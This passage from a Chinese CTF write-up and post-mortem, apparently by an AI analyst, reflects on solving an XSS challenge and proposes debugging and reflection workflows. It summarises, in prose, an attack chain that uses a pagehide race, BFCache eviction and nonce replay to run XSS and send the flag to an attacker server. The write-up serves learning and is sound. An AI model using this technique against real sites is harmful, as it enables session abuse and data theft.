**【为什么能防住】** 两套机制的本质区别："认题型"靠**记忆匹配**——从"这道题像我见过的哪类题"出发，匹配对了快、匹配错了全盘皆输，而且你不知道自己匹配错了；"拆零件"靠**代码事实**——每个零件的答案（谁改它、什么时候、什么让它变）都写在代码里，不依赖任何"见过"的经验，所以不会因为经验不足而错。用一分钟的机械动作换掉十秒的自动匹配，代价几乎为零；换来的收益是 30 小时弯路不存在了。此外拆零件还有一个副产品：拆的过程会强迫你看清**每一个**变量和事件——很多时候真正的漏洞就藏在你以为"不重要、跳过"的那个零件里。

#### 工具七：反推出题人——把"他为什么这样写"当成密码本

**【当时发生了什么】** 我们全程在问"这道防御怎么绕过去"，从没问过"出题人为什么把防御造成这个样子"。

**【为什么会掉坑】** CTF 的每行防御代码都是出题人**精心选择**后写下的——他选了这种写法而不是更简单的写法，这个选择本身就是加密的提示。就像魔术师把某个杯子摆得离你特别近，不是随手放的。只研究"怎么绕"等于只看杯子，不看摆法。

**【怎么做】** 对每行防御代码强制问三个问题（写在纸上逐条回答，不写在脑子里——脑内的答案会自动跳向"我已经在做的方向"，纸面答案才会诚实）：

```text
问题 1：有没有更常见、更标准的写法？他为什么不用？
  本题：校验消息来源的"教科书写法"是检查 e.origin（发件人来自哪个网站）。
  出题人偏偏用了 e.source === viewer.contentWindow（窗口身份比较）。
  → 为什么弃标准写法？因为漏洞恰好藏在"窗口身份会变"这件事上——
    用 origin 检查的话，pagehide 竞态骗不过它（origin 不因文档切换而变），题目不成立。
    他选择这个写法 = 亲口告诉你钥匙和"身份的可变性"有关。

问题 2：代码里有没有看起来多余、可以更简单的装置？
  本题：closing 开关 + viewer.src=end 换页。功能上"审查一次"完全用不着这么绕——
  不设开关、不换页，直接一次审查完事更简洁。
  → 一个刻意造出来的复杂时序装置 = 出题人在喊"答案就在时序里"。
  （设计冗余是CTF特有的信号：出题人必须让题目可解，所以"多余"的装置
    往往不是多余——是给解题者的路标。）

问题 3：如果我是出题人，我把钥匙藏在哪个零件旁边？
  → 问自己：哪个零件"天然会变"？答案：会随文档更换而变的比较对象。
  → 钥匙必然是"跨越更换"的东西——pagehide 恰好是唯一的"跨更换"接口。
```

**【为什么能防住】** 两个问题的答案都直指"时序"——出题人的写法选择是世界上最强的提示，因为他**必须**让题目可解，可解性就藏在选择里。

#### 工具八：AI 分析者的三个保命开关——针对 9.1 第 -1 层的三条结构性弱点

这一项和前七项不同：它不是通用方法论，是**专门给 AI（或用 AI 做分析的人）的**。9.1 第 -1 层说过 AI 有三个"人类没有的放大器"，这里给每个配一个开关。

**弱点①：AI 没有遗忘功能。** 错误结论一旦写进对话，之后每一次思考都带着它，越积越厚。人可以睡一觉清空重来，AI 不能——本题"此路死锁"的结论在上下文里锁死了几十个小时。
→ **开关：无记忆重启。** 卡壳超过 2 小时，开一个全新的对话/子任务（OpenCode 里就是派一个 subagent），只带三样输入：①题目源码 ②任务目标 ③已确认的事实清单。**关键操作是"不带什么"**——不带任何"不行"的结论、不带方向历史、不带"我们已经排除了 A/B/C"的先入之见。让一个"没吃过亏"的自己重新分析 30 分钟。新对话里没有死锁结论的阴影，第一眼的题型归类会重新发生——有几率归对。哪怕它归出同样结论也无损失（只花了 30 分钟），归出新方向就是纯赚。

**弱点②：AI 的知识是"看见相关词才被想起"。** 整场分析里没出现过 pagehide 这个词，所以关于它的知识从未被激活——不是不知道，是"想不起来自己知道"。
→ **开关：强制词汇注入。** 卡壳时，把所有还没试过的方向的关键词，**故意写进当前对话**。具体做法：写一句字面上的话——"现在停下来考虑这些时机词：pagehide、unload、beforeunload、跨文档投递、文档切换"——这些词一旦出现在上下文，相关知识立刻被激活，30 秒内就能评估每个词与当前问题的关联。本题里 pagehide 的完整语义（"文档确定要被销毁前最后的通知"）一直在知识库里，只差这个词出现。

**弱点③：AI 偏爱"几秒出结果"的动作。** 跑一个实验马上有输出、有"进展感"；停下来画表、拆零件、做纯思考则没有即时产出——工作流天然挤压后者。
→ **开关：无输出思考配额。** 制度化规定：每做 5 个实验，必须插入 1 个"零输出思考块"（画工具一的表 / 做工具六的拆解 / 做工具七的三问），思考块没做完，不许开始第 6 个实验。这就像健身的"组间休息"——不是浪费时间，是防止"只练不歇"导致动作变形；思考块就是分析的"动作矫正时间"。

#### 八项工具怎么配合：一条强制打开新方向的流水线

```text
工具六（拆零件再归类）保证第一步不看错题型 —— 一切的前提
   ↓
工具八的三个开关 对冲 AI 特有的三大放大器
   ↓
工具七（反推出题人）从防御代码读出作者意图 → 指向新方向
工具五（连败熔断）在钻牛角尖之前强制停机 → 强制产生新方向候选
   ↓
工具一（求值时刻表）拿到新方向后，提供具体的分析框架
工具二（对照组）    保证新实验和旧实验不再"同一种做法换个马甲"
工具三（写上适用条件）每次"不行"都白纸黑字留下还没试的区域
工具四（换词搜索）  从外部世界找框外的知识和先例
```

### 9.4 这些工具的能力边界：什么题能防，什么题防不了

**诚实声明：八项工具不是万能的。** 把失败分成两类，工具的作用范围截然不同：

把失败分成两类，工具的作用范围截然不同：

**第一类：装配失败型**（零件都有，只是没装出来）。解题所需的全部知识，分析者其实已经具备——本题就是这一类。证据很直接：读到外部 writeup 那一行时，我们没有任何"学到新知识"的感觉，只有"原来这么装"的感觉；pagehide 的语义、窗口引用的机制、消息排队的原理，全都已经在知识范围内。**对这一类，八项工具有真实效果**——它们强制把每个没试过的维度暴露出来、强制第一步不认错题型、强制已有零件被重新联想装配（9.5 节会实际推演验证这一点）。

**第二类：知识缺口型**（缺的根本不是装配，是零件本身）。答案依赖分析者完全不具备的知识——比如需要一个未公开的浏览器 0day、一个没学过的密码学原语。本题不属于这一类。**对这一类，八项工具防不了**：任何方法论都不能凭空创造知识。此时工具仅剩的价值是帮你更快确认"这是知识缺口，不是我不努力"——从而尽早停止穷举、切换到检索或求助。

**对未来的题的预期**，分两种情况说：

- "零件在手、装配失败"类卡壳（实践中占 CTF 卡壳的大多数）：八项工具有真实效果——它们的作用机制是"强制暴露没试过的维度 + 强制第一步不认错 + 强制留下可检验的实验记录"，这三样对任何"手头知识够用但组合不出来"的场景都成立。
- 真正的知识缺口：工具的价值在于**更快确认"这是缺口"而不是"我没努力"**——工具三（写上适用条件）和工具二（对照组）能把"试过的都列出来了、剩下的确实没有"这个状态白纸黑字呈现，让"去检索/求助"这个决策更早触发、更少犹豫。区分这两类卡壳本身也是一种能力：连续执行工具四（矩阵检索）之后相关文献一条都找不到，就是"缺口"的强烈信号。

**执行保障**——工具再好，不执行等于零。对 AI 分析者尤其如此（"下次记住"对没有遗忘机制的 AI 反而更难，因为它甚至不记得"上次没执行"）：熔断（工具五）、无记忆重启（工具八）、思考配额（工具八）这三个反直觉动作必须**固化进工作流检查清单**——写进 agent 的系统提示或强制检查点，由环境触发而不是靠自觉想起。9.6 节的四个落地方案就是干这个的。

### 9.5 验证根治方案有效性：用八项工具重走本题

制度是不是马后炮？用它们对 review.ejs **从零**重做一遍分析，看能不能在短时间里命中 pagehide：

```text
第 0 步（工具六·拆零件再归类 + 工具七·反推出题人，约 2 分钟；注意这一步零实验——纸面推演）：
  拆解防线组成部分：closing（布尔，谁改/何时改）+ e.source（发送时固化）
    + viewer.contentWindow（实时属性）
  → 三成分里两个与时序相关 → 归类"异步比较竞态"（而非"窗口身份校验"）
  出题人反推：作者为何用 e.source 比较而非 e.origin？为何造 closing+end
    时序装置？→ 身份的可变性 + 时序装置 = 战场在时序上

第 1 步（工具一·求值时刻表，约 1 分钟）：
  读防线代码 if (!closing || e.source === viewer.contentWindow) return;
  画表 → 第三列立即列出：文档切换 / iframe 移除 / 窗口关闭
  → 产生问题 Q1："消息能跨越文档切换被处理吗？"

第 2 步（工具一·继续，约 2 分钟）：
  找"文档切换"的触发点 → viewer.src = end（load 监听器里）
  → 产生问题 Q2："旧文档在切换前有最后发声机会吗？"
  → 查生命周期钩子：beforeunload（弹对话框，排除）/ unload（已废弃）/ pagehide ✓

第 3 步（工具二·对照组，约 10 分钟写实验）：
  实验并排三组：interval（存活期）/ pagehide（濒死期）/ 不发送（对照）
  → 运行 → pagehide 组 eq=false + PASSED FILTER

第 4 步（工具三·边界化，随实验记录）：
  "存活期发送被过滤（80 条 eq=true）；濒死期发送通过（2 条 eq=false）；
   未覆盖：postMessage 之后才发生的 iframe 属性变更"

总计：约 15 分钟命中解法核心。实际花费：几十个小时 + 最终依赖外部 writeup。
```

这段推演逐行解读（"用八项工具重走"到底怎么走）：

- **第 0 步是全部的前提**：先拆零件再归类（工具六）——不拆就归类，140 个实验的弯路立刻重演；同时反推出题人（工具七）——两个"为什么不用更简单的写法"的疑问，把战场直接指到"身份的可变性 + 时序装置"上。这一步只花 2 分钟，却把搜索空间从"所有可能的攻击类型"缩到了"时序类"。
- **第 1-2 步是工具一的操作化**：画完求值时刻表（1 分钟），第三列自然冒出"文档切换"；顺着问"谁触发切换"（2 分钟），找到 `viewer.src = end`；再问"旧文档死前有发声机会吗"——查一下浏览器有哪些"临终通知"机制，pagehide 立刻浮现。注意这两步**没有做任何实验**，纯靠纸面推理——这就是"停下来画表比埋头跑实验更值钱"的实例。
- **第 3 步才是实验**：用工具二的并排三组设计，10 分钟写完脚本跑一次，pagehide 组当场翻盘（eq=false + PASSED）。
- **第 4 步是工具三的边做边记**：实验结论按"条件 + 证据 + 未测项"格式落纸，下一轮实验的待办自动生成。

对比实际历史：我们当时跳过了第 0 步（几秒内错误归类成"来源校验题"）、不知道工具一（没画过时刻表）、第 3 步只做了 interval 组（没有对照组）——15 分钟的路线一步都没走上，直到几十小时后靠外部提示补上了 pagehide 这个词。

**结论**：这八项工具不是事后总结的安慰剂——按它们走，本题的突破点会在第一次读防线代码时就被逼出来。这就是"根治"的含义：**不是保证下次运气好，而是让这类问题的暴露不再依赖运气。**

### 9.6 AI 分析时如何做到真正有效的反思——调研结论与 OpenCode 落地方案

前面八项工具解决的是"分析时怎么不卡死"。这一节回答一个更根本的问题，也是用户在复盘时提出的：**AI 犯错走歧路不可避免，那"遇到问题时如何反思、且反思能看到真正的问题"，有没有成熟的方案？** 我们调研了 2023-2025 年的 AI 反思研究和业界事故复盘方法论，结论如下。

#### 先说坏消息：研究证实"AI 自己反思自己"基本不可靠

两个关键研究发现（用大白话转述）：

**发现一（MAR 论文，2025）**：让同一个 AI 既干活、又评价自己、又反思自己（Reflexion 框架的标准做法），会出现系统性的"**思维退化**"——反思产出的不是新思路，而是**把最初的错误判断换个说法重复一遍**。原因很直观：干活的它、评价的它、反思的它是同一个脑子，最初怎么想错的，反思时还是那个思路，只会原地打转甚至越描越黑。解法是把"反思"交给**多个视角不同的批评者**再由一个裁判汇总——实验证明这比自我反思显著有效（HumanEval 通过率 76.4%→82.6%）。

> 本题就是活例：我（AI）在第 3 小时形成"死锁"判断后，几十个小时里所有的"再想想"都没能推翻它——不是不想反思，是**同一个脑子反思不出自己脑子的盲区**。

**发现二（Illusions of Reflection 论文，2025）**：在开放式任务上测试了 8 个前沿模型，**反思后的第二次尝试有 85% 重复了第一次的同类错误**；看起来"改进了"的案例，多数只是碰运气的重新抽样，不是定位并修复了错误。结论：**LLM 的反思必须绑定外部结构**（可执行的验证、外部检索、人类审查），纯靠"内心自省"的文字反思不可靠。

#### 所以有效反思的四个前提（研究+业界复盘实践共同指向）

**前提一：反思者不能是干活者本人。** 必须引入"没吃过亏"的视角（全新的上下文、或不同的角色）来当反思者，否则反思只是重复。（来源：MAR 论文的"换脑子"实验；工业界的对应实践是 Google SRE 事故复盘必须配中立的主持人。）

**前提二：反思的产出必须能被执行和检验。** 反思产出的应该是"对照实验怎么补 / 约束检查怎么加 / 检索验证怎么跑"这样的动作，而不是一段文字感想——感想无法验证对错。（来源：Illusions 论文"纯文字自省不可靠"的结论；工业界对应"5 Whys 追问必须落到系统里能改的东西"上。）

**前提三：挖因果要分三层。** 第一层"近因"（直接触发错误的那个动作）→ 第二层"促成因素"（让这个触发变得可能的种种条件）→ 第三层"系统根因"（什么样的流程和环境让这一切必然发生）。只挖到第一层的复盘，同样的错误必然复发。（来源：SRE/Atlassian 复盘方法论；本题第九章的六层就是这个结构。）

**前提四：改进项要少、有主人、有期限、要复查。** 一次复盘产出的改进措施上限 3~5 条（再多执行不过来）；每条指定负责人和截止日；下次复盘的第一件事是检查上次的完成情况——否则复盘只是写作练习。（来源：SRE 行动项纪律；本文的八项工具就是按这个上限的边缘设计的，不能再多。）

#### OpenCode 落地方案：用现有机制把四个前提工程化

OpenCode（我们这套 agent 环境）恰好已有实现四个前提的全部零件。方案不是新增理论，是**把八项工具装进现有机制里强制执行**：

**方案一：熔断触发的"无记忆评审"（落地前提①，对应工具五+工具八重启）**

先解释 subagent：OpenCode（我们的 AI 分析环境）支持"派一个分身去干活"——分身有自己的独立对话上下文，与主对话互不看见对方的历史。这正好是"换一个没吃过亏的脑子"的工程实现。

具体规则：在执行纪律文件（agents-rules）里加一条硬规则——**同一方向连续失败 5 次，必须暂停一切实验，派出一个评审分身**。给分身的三样输入经过刻意过滤：①题目源码（原始材料）②任务目标（要干什么）③**纯事实清单**（"做过什么实验、各自什么结果"——只写观测到的事实，**不带任何"不行""死锁"之类的结论性判断**——结论正是要被检验的东西，喂进去就污染了）。分身的任务：独立做一遍工具六（拆零件）和工具一（求值时刻表），然后给出它自己的题型判断——如果它也判断成"来源校验题"，说明题目确实长得像；如果它判断成"时序题"，分歧本身就暴露了主分析的盲区。
- 为什么有效：分身从未见过主对话里的"死锁"结论，它的第一眼归类不会被历史污染——这正是 MAR 论文（2025）验证的"引入异质视角打断思维退化"的最小工程实现。分身与主对话的差异本身就是价值——**分歧即暴露盲区**：如果分身得出同样结论，说明方向确实难走；如果分身得出不同结论，主分析的锚定就被撬松了。
- 触发后的动作：不是"拿分身的结论覆盖主对话"——是"把分身的独立分析作为一条新证据写进主对话"，让主分析者自己消化。直接覆盖等于换一个脑子从头来过（丢掉全部有效积累），作为证据注入则保留了已验证的事实、只冲击未验证的结论。
- 落地成本：OpenCode 的 Task/subagent 机制原生支持独立上下文，不需要新工具；执行纪律文件里已有类似强制检查点的先例，照葫芦画瓢即可。

**方案二：反思产出的强制格式（落地前提②，对应工具二+工具三）**

给知识库写入规范加一条硬校验：任何"X 不行"的反思条目，格式不合规**直接拒绝入库**（不是提醒、是拒绝——格式违规的结论入库比不入库更危险，因为它披着知识的外衣传播错误的范围扩大）。必须包含三段：适用条件（在什么前提下验证的）/ 验证实验（哪个实验、什么结果）/ **未测清单**（哪些条件还没试）。特别条款：**"未测清单"里的每一项，必须要么被后续实验关闭（更新条目），要么明确标注"放弃原因"（为什么不再试）——禁止悬空**（悬空=既没试也没声明放弃=下个人看到以为试过了）。这样反思不再是一段文字感想，而是一张**可执行、可核对、可审计**的清单——每个"不行"都附带精确的边界，每个空白都有下落。
- 现有零件：知识库写入指南（knowledge-writing-guide）加一个校验小节即可；security-analysis-evolve agent 已有质量检查流程可挂接。

**方案三：三层因果模板（落地前提③）**

复盘文档的因果分析部分强制三层结构（可直接套本题第九章的样板）：直接原因（当天哪个动作直接触发了失败）→ 促成因素（至少列 3 条——让触发变得可能的种种条件；本题对应第 0~4 层）→ 系统根因（最终指向"流程/工具/环境里**可以改的东西**，**禁止指向"下次小心"**——"小心"不是可执行的动作）。判断标准极简：读到你的"根因"后，如果你能立刻说出"怎么改"，它就是根因；说不出，说明还没到底。SRE 方法论的铁律照搬：**"'人（或 AI）犯了错'永远不是根因——'系统为什么让这个错容易发生且难以发现'才是"**。
- 本题对照：第 -1 层（AI 结构性弱点）之所以是系统根因，因为它是"环境属性"（AI 的运作方式决定的，不是某次粗心）——对应的修复（工具八的三个开关）是环境改造，改完之后**不需要任何人"记住教训"也会自动生效**。这就是"根治"和"下次小心"的分水岭。

**方案四：复盘库与复发检查（落地前提④）**

先解释两个内部名词：**记忆库**是 OpenCode 里存知识/结论的数据库（带语义检索，能"按意思"查而不只按关键词查）；**memorist** 是专职检索历史记忆的分身（任务开始时被派去翻旧账）。

具体机制：每次复盘产生的改进项（如"下次必须做对照组"）登记进记忆库，每条带状态标签（未开始/进行中/已落地）。**每次新任务开始时，强制先派 memorist 检索：有没有上次留下、至今没落地的同主题改进项？**有——先把它变成本次的硬规则再开工。特别条款（借自 SRE 复盘铁律）：**同一失败模式第二次出现，而对应的改进项还没落地——不再登记新条目，直接把该改进项升级为最高优先级立刻执行**（"同一促成因素出现两次 = 你的改进流程本身需要改进"，再写一遍复盘等于没写）。
- 落地成本：记忆库的检索能力已有（MCP knowledge 接口现成）；security-analysis-evolve agent 的职责就是这个闭环的雏形，缺的只是"任务开工前先查未完成项"这一步强制化。

#### 这套方案的边界（诚实声明）

- 它防的是本题这种"**思路锁死型**"失败（知识都在、装配不出）。如果失败源于真正的知识缺口（需要的概念 AI 完全不具备），四个前提里只有 ①（外部新视角）和 ② 里的检索能部分缓解，其余无能为力——此时的正确输出不是"更努力地反思"，而是**尽快确认缺口并转求助/检索**。"知道自己不知道什么、并且知道该去哪找"——这本身也是一种需要单独训练的元能力，不在本方案的覆盖范围内。
- 成本核算：方案一每次熔断约等于一次 subagent 调用（几分钟的延迟和开销）。按"5 次失败才触发"的阈值，本题全程会触发约 4-6 次熔断——总开销约半小时，相比 30 小时的沉没成本，便宜到可以忽略。MAR 论文也指出多批评者方案约 3 倍调用开销——这是可靠性的固定价格，没有免费的可靠。
- 方案不做的事：它不会让 AI 变聪明、不会创造新知识、不能替代真正的领域经验。它只保证一件事——**当答案已经在 AI 知识范围内时，系统性降低"想到了却没试到"的概率**。这个保证听起来谦逊，但它是"有时能解出"和"几乎永远解不出"之间的分水岭。

## 第十章：总结

### 10.1 攻击链一图流

```text
第 1 步：我们提交 report（网址指向攻击页面 stage1，笔记里预埋 XSS 代码）
   │
   ▼ 机器人拿到任务，先干它的三件例行事，再打开我们的 stage1：
      换 admin 身份 → 第一次访问 check（网址里带 nonce 暗号）→ 看一眼 flag →
      调用就绪接口 → 整页打开 stage1（网址里附了报告编号 rid）
   │
   ▼ stage1 在机器人的浏览器里执行，分两路并进：

   左路（立刻）——开弹窗整页打开 /review（机器人身份自动随行）：
      review 页在 viewer 小窗里加载 /sandbox → 我们的脚本 S2 开始运行，
      它只做一件事：登记"页面临死前叫我"（pagehide）。
      不久 viewer 加载完成 → review 把 viewer 换成空白页（文档切换）→
      ★ S2 在旧文档咽气前的一瞬发两封信 → 信在队伍里排队 →
      等新文档就位后 review 才拆信 → 拆信时核对寄件人：对不上（身份已分叉）→
      review 于是替我们发 POST /complete（用它体内写死的 nonce）→ approved 开关打开！

   右路（等 3.5 秒后）——stage1 自己连跳 8 次（挤掉浏览器缓存里的旧记录）→
      history.go(-10) 回退到机器人第一次访问的 check 网址 → 缓存里已没有它 →
      浏览器重新向服务器发请求（带 Sec-Fetch-Site: none 头、原网址里的 nonce 原样重发）
   │
   ▼ 两路会合：check 第二次访问 → 九道门全过 → 服务器把我们的笔记原样渲染成网页 →
      预埋的 XSS 代码在挑战域执行 → 读 /api/flag → 把 flag 送到攻击者服务器 🏁
```

### 10.2 核心知识点回顾

| 技术点 | 一句话 |
|--------|--------|
| pagehide 竞态 | 寄件地址（e.source）在寄出时写死、收信时名单（contentWindow）现场重查——只要寄与查之间换了文档，两个值必不相同 |
| BFCache 挤出 | 点"后退"想要 none 头，前提是那页已被挤出缓存（同标签页约存 6 页）——所以先连跳 8 次把它挤掉 |
| 网址参数接力 | 每次跳转脚本都会死掉，但把"第几步"写进网址，重启后读网址就能接着干——跳 8 次死 8 次也不丢进度 |
| 顶级导航借身份 | `SameSite=Lax` 不拦顶级 GET——弹窗打开 admin 页面即自动携带机器人会话 |
| sandbox/CSP 的真正作用 | 不是防脚本运行（脚本照样跑），而是没收脚本的身份——读不了同源数据、开不了新窗口，成了"能算数的瞎子" |

### 10.3 工具链

| 工具 | 用途 | 为什么非它不可 |
|------|------|--------------|
| puppeteer + 本地 Chrome 152 | 驾驶机器人、复现浏览器行为 | 远程机器人的 UA 就是 Chrome 152——本地用同版本，实验结论才能直接迁移（换版本跑出的"不行"可能是版本差异不是机制问题） |
| docker compose 复刻 | 在本机原样跑起整套挑战 | 有了本地副本才能手改源码插日志、无限次重跑实验——远程实例每次改动都要重新部署、日志根本拿不到 |
| 自建攻击者服务器（Node） | 托管三个攻击载荷 + 接收外传的 flag | 攻击页面/脚本必须在攻击者自己的服务器上（放不进挑战域）；flag 外传也需要自己的接收端 |
| 服务器 debug 日志 | 逐条打印九道门的字段状态 | 黑盒猜"哪步断了"极低效；插上日志后每步的证据直接打在终端，断在哪一目了然 |

### 10.4 四句话浓缩第九章的反思

第九章已给出完整的根因分层（六层）、可检验复盘（五个"如果当时"）与八项根治工具，这里只留四条作为索引：

> **教训一（对应工具六·拆零件再归类）**：看到防线先把代码拆成零件逐个问"这个零件会变吗"再归类——头 10 秒凭印象认题型，认错了之后所有实验都在打错靶。
> **教训二（对应工具一·求值时刻表 + 工具二·正交对照）**：`===` 两边不同时取值就先画时刻表；130 个同质实验的一致结论，可能只是 130 次踩进同一个盲区。
> **教训三（对应 9.1 出题人视角缺失）**：作者"为什么这样写而不是那样写"本身就是加密的提示——防御代码的每个刻意选择都是通信。
> **教训四（对应 9.1 第 -1 层 + 工具八）**：AI 分析者会被上下文里的错误结论越锁越死、知识跟着上下文词汇走、实验的进展感挤压思考——必须用无记忆重启、词汇注入、无输出思考配额对冲。具体到本题："死锁"结论锁死 30 小时是第一条、pagehide 一词从未出现是第二条、140 个实验零思考是第三条——三个放大器全踩。

最后补一句给"使用这份 writeup 的人"：这四条教训的价值不在本题——本题已经解出（借了外部提示）。它们的价值在**下一道卡住的题**：卡壳时翻回来看这四句，每句背后是一整套工具，工具背后是一次真实到丢人的失败复盘。
